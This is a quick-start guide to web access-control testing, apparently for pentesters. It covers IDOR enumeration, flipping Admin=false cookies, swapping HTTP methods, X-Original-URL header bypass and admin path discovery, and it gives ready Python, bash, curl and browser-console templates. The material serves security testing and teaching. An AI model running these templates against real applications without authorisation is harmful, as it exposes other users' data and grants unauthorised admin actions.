# Access Control Vulnerabilities - Quick Start Guide

**Get started with access control testing in 5 minutes**

---

## What Are Access Control Vulnerabilities?

Access control (authorization) determines who can access what resources and perform which actions. When these controls are broken, attackers can:

- Access other users' data (horizontal privilege escalation)
- Access admin functionality (vertical privilege escalation)
- Modify their own privileges
- Bypass authentication and authorization checks

**Impact:** Data breaches, unauthorized actions, account takeover, privilege escalation

---

## 5-Minute Quick Start

### Prerequisites
- Burp Suite (Community Edition is free)
- Web browser with proxy configured
- Target application access

### Basic Testing Flow

**1. Map the Application (1 minute)**
```
✓ Identify user roles (guest, user, admin)
✓ Find user-specific resources
✓ Locate admin functionality
✓ Note parameter names (id, user, role, etc.)
```

**2. Test Horizontal Privilege Escalation (2 minutes)**
```
✓ Create two user accounts
✓ Access User A's resource
✓ Change parameter to User B's identifier
✓ Check if you can access User B's data
```

**3. Test Vertical Privilege Escalation (2 minutes)**
```
✓ Log in as regular user
✓ Try accessing /admin or /administrator
✓ Look for admin=false cookies
✓ Test changing to admin=true
```

---

## Essential Test Cases

### Test 1: Direct URL Access (30 seconds)
```bash
# Try accessing admin pages directly
https://target.com/admin
https://target.com/administrator
https://target.com/admin-panel
https://target.com/dashboard
```

**What to look for:** Pages that load without authentication

---

### Test 2: IDOR - Basic (1 minute)
```bash
# Your account page
https://target.com/profile?id=123

# Try other users
https://target.com/profile?id=124
https://target.com/profile?id=125
```

**What to look for:** Access to other users' data

**Burp Suite Method:**
1. Intercept request with your ID
2. Send to Repeater (Ctrl+R)
3. Change ID to another user's
4. Send request
5. Check if you get their data

---

### Test 3: Cookie Manipulation (1 minute)
```javascript
// In browser console
document.cookie

// If you see Admin=false or similar
document.cookie = "Admin=true; path=/";

// Reload page
location.reload();
```

**Burp Suite Method:**
1. Enable response interception (Proxy > Options)
2. Log in
3. Intercept login response
4. Change Admin=false to Admin=true
5. Forward response

---

### Test 4: Method-Based Bypass (1 minute)
```http
# If POST is blocked
POST /admin/delete-user
Body: username=victim

# Try GET
GET /admin/delete-user?username=victim
```

**Burp Suite Method:**
1. Capture blocked POST request
2. Send to Repeater
3. Right-click > Change request method
4. Send as GET

---

### Test 5: Hidden Admin Paths (30 seconds)
```bash
# Check robots.txt
https://target.com/robots.txt

# View page source
# Search for: admin, panel, role, privilege
# Look in JavaScript files
```

---

## Common Vulnerability Patterns

### Pattern 1: Unprotected Admin Functionality
**Signs:**
- Admin pages load without login
- robots.txt reveals admin paths
- JavaScript contains admin URLs

**Test:**
```bash
curl https://target.com/admin
curl https://target.com/robots.txt
```

---

### Pattern 2: Parameter-Based Access Control
**Signs:**
- Cookies like Admin=false
- JSON with role parameters
- URL parameters with privileges

**Test:**
```http
# Modify cookie
Admin=false → Admin=true

# Inject into JSON
{"email":"test@test.com","role":"admin"}
```

---

### Pattern 3: IDOR (Insecure Direct Object Reference)
**Signs:**
- URLs with user IDs
- Predictable file names
- Sequential identifiers

**Test:**
```
/user/123 → /user/124
/download/1.txt → /download/2.txt
/api/account/abc → /api/account/xyz
```

---

### Pattern 4: Method-Based Bypass
**Signs:**
- POST requests blocked
- Different methods not tested
- Authorization on one method only

**Test:**
```
POST /admin → GET /admin
GET /data → DELETE /data
POST /update → PUT /update
```

---

### Pattern 5: Multi-Step Bypass
**Signs:**
- Confirmation dialogs
- Multi-page workflows
- "Are you sure?" prompts

**Test:**
```
# Skip step 1, go directly to step 2
POST /action?confirmed=true
```

---

## Testing Checklist (5 Minutes)

### Quick Security Assessment

**☐ Unprotected Functionality (1 min)**
- [ ] Try /admin, /administrator, /admin-panel
- [ ] Check /robots.txt
- [ ] View page source for admin URLs

**☐ IDOR Testing (1 min)**
- [ ] Find URLs with IDs
- [ ] Change to other user IDs
- [ ] Test file downloads with different numbers

**☐ Cookie/Parameter Manipulation (1 min)**
- [ ] Check cookies for Admin, role, privilege
- [ ] Try modifying to admin values
- [ ] Inject role parameters into JSON

**☐ Method-Based Bypass (1 min)**
- [ ] Convert POST to GET
- [ ] Test PUT, PATCH, DELETE
- [ ] Check if authorization differs by method

**☐ Header Manipulation (1 min)**
- [ ] Test X-Original-URL header
- [ ] Test Referer spoofing
- [ ] Try X-Forwarded-For for IP-based controls

---

## Exploitation Templates

### Template 1: IDOR Enumeration
```python
#!/usr/bin/env python3
import requests

for user_id in range(1, 100):
    r = requests.get(
        f"https://target.com/api/user/{user_id}",
        cookies={"session": "YOUR_SESSION"}
    )
    if r.status_code == 200:
        print(f"[+] User {user_id}: {r.text[:100]}")
```

### Template 2: Method Testing
```bash
#!/bin/bash
URL="https://target.com/admin/action?user=victim"
for method in GET POST PUT PATCH DELETE; do
    echo "Testing $method"
    curl -X $method "$URL" -H "Cookie: session=YOUR_SESSION"
done
```

### Template 3: Cookie Modification
```javascript
// Browser console
const cookies = document.cookie.split('; ');
cookies.forEach(c => {
    if (c.includes('Admin=') || c.includes('role=')) {
        console.log('Found:', c);
    }
});

// Modify
document.cookie = "Admin=true; path=/";
document.cookie = "role=administrator; path=/";
location.reload();
```

---

## Detection Quick Reference

### Signs of Access Control Issues

**🔴 High Risk Indicators:**
- Admin pages accessible without login
- User IDs in URLs without validation
- Cookies like Admin=false, role=user
- Redirects with data in response body
- Method-based authorization differences

**🟡 Medium Risk Indicators:**
- Predictable file/resource naming
- GUIDs exposed in public interfaces
- Multi-step processes without re-validation
- Referer-based access controls

**🟢 Testing Opportunities:**
- Any URL parameter with numbers/IDs
- Any cookie with role/privilege keywords
- Any JSON with user attributes
- Any multi-step workflow
- Any admin functionality

---

## Quick Command Reference

### cURL Examples
```bash
# Test admin access
curl https://target.com/admin \
  -H "Cookie: session=abc123"

# IDOR test
curl https://target.com/api/user/123 \
  -H "Authorization: Bearer token"

# Method bypass
curl -X GET https://target.com/admin/delete?user=victim \
  -H "Cookie: session=abc123"

# Header bypass
curl https://target.com/ \
  -H "X-Original-URL: /admin" \
  -H "Cookie: session=abc123"
```

### Burp Suite Repeater
```
1. Capture request (Proxy tab)
2. Right-click > Send to Repeater
3. Modify: URL, headers, body
4. Click "Send"
5. Analyze response
```

### Browser Console
```javascript
// View cookies
document.cookie

// Modify cookie
document.cookie = "Admin=true; path=/";

// Reload
location.reload();

// Reveal password fields
document.querySelectorAll('[type=password]')
  .forEach(i => i.type='text');
```

---

> **See also:** `access-control-cheat-sheet.md` for payloads and techniques, `access-control-resources.md` for CVEs and learning resources.

